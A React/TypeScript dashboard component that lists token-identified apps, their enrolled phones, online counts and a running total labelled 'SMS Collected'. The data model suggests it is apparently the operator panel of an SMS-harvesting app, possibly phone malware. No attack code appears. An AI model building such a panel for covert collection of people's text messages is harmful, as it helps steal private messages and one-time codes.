import { useEffect, useState } from "react";
import { Boxes, Smartphone, MessageSquare, RefreshCw, TrendingUp } from "lucide-react";
import StatCard from "@/components/StatCard";
import Badge from "@/components/Badge";
import type { AdminApp, Device } from "@/lib/types";
import { getApps, getDevices, calcStats } from "@/lib/supabase";

export default function Dashboard() {
  const [apps, setApps] = useState<AdminApp[]>([]);
  const [deviceMap, setDeviceMap] = useState<Record<string, Device[]>>({});
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);

  const load = async (silent = false) => {
    if (!silent) setLoading(true); else setRefreshing(true);
    try {
      const loaded = await getApps();
      setApps(loaded);
      const map: Record<string, Device[]> = {};
      await Promise.allSettled(
        loaded.map(async (a) => {
          try { map[a.token] = await getDevices(a.token); } catch { map[a.token] = []; }
        })
      );
      setDeviceMap(map);
    } finally {
      setLoading(false); setRefreshing(false);
    }
  };

  useEffect(() => { void load(); }, []);

  const totalApps  = apps.length;
  const activeApps = apps.filter((a) => a.is_active).length;
  const allDevices = Object.values(deviceMap).flat();
  const totalDev   = allDevices.length;
  const totalSms   = allDevices.reduce((s, d) => s + (d.total_sms_count ?? 0), 0);
  const now        = Date.now();
  const onlineDev  = allDevices.filter((d) => {
    const t = d.data_json?.online_checked_at ?? 0;
    return t > 0 && now - t < 15 * 60 * 1000;
  }).length;

  return (
    <div className="flex-1 overflow-auto h-full bg-[#080c16]">
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center justify-between px-4 sm:px-6">
        <div>
          <h1 className="text-sm font-semibold text-white">Dashboard</h1>
          <p className="text-xs text-slate-600 hidden sm:block">Overview of all applications</p>
        </div>
        <button onClick={() => void load(true)} disabled={refreshing}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-400 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3 h-3 ${refreshing ? "animate-spin" : ""}`} />
          Refresh
        </button>
      </div>

      <div className="p-3 sm:p-6 space-y-4 sm:space-y-6">
        {loading ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Loading…</span>
          </div>
        ) : (
          <>
            <div className="grid grid-cols-2 lg:grid-cols-3 gap-2 sm:gap-4">
              <StatCard label="Total Apps"    value={totalApps}                  icon={Boxes}         color="blue"  sub={`${activeApps} active`} />
              <StatCard label="Total Devices" value={totalDev}                   icon={Smartphone}    color="green" sub={`${onlineDev} online now`} />
              <StatCard label="SMS Collected" value={totalSms.toLocaleString()} icon={MessageSquare} color="amber" sub="total messages" />
            </div>

            <div>
              <h2 className="text-sm font-semibold text-white flex items-center gap-2 mb-3">
                <TrendingUp className="w-4 h-4 text-blue-400" />
                All Applications
              </h2>
              {apps.length === 0 ? (
                <div className="text-center py-12 bg-[#0d1220] border border-slate-800 rounded-2xl">
                  <Boxes className="w-7 h-7 mx-auto text-slate-700 mb-2" />
                  <p className="text-sm text-slate-600">No apps yet. Create one in the Apps tab.</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {apps.map((app) => {
                    const devs   = deviceMap[app.token] ?? [];
                    const stats  = calcStats(devs);
                    return (
                      <div key={app.id} className="bg-[#0d1220] border border-slate-800/80 rounded-2xl p-3 sm:p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2 min-w-0">
                            <p className="text-sm font-semibold text-white truncate">{app.label || app.token}</p>
                            <Badge variant={app.is_active ? "active" : "inactive"} />
                          </div>
                          <span className="text-xs text-slate-600 font-mono flex-shrink-0 ml-2">{app.token}</span>
                        </div>
                        <div className="grid grid-cols-3 gap-2">
                          {[
                            { label: "Devices", value: stats.total,   color: "text-white" },
                            { label: "Online",  value: stats.online,  color: "text-emerald-400" },
                            { label: "SMS",     value: devs.reduce((s, d) => s + (d.total_sms_count ?? 0), 0), color: "text-amber-400" },
                          ].map(({ label, value, color }) => (
                            <div key={label} className="bg-[#080c16] rounded-xl px-3 py-2.5 text-center">
                              <p className={`text-lg font-bold ${color}`}>{value}</p>
                              <p className="text-[10px] text-slate-600">{label}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </>
        )}
      </div>
    </div>
  );
}
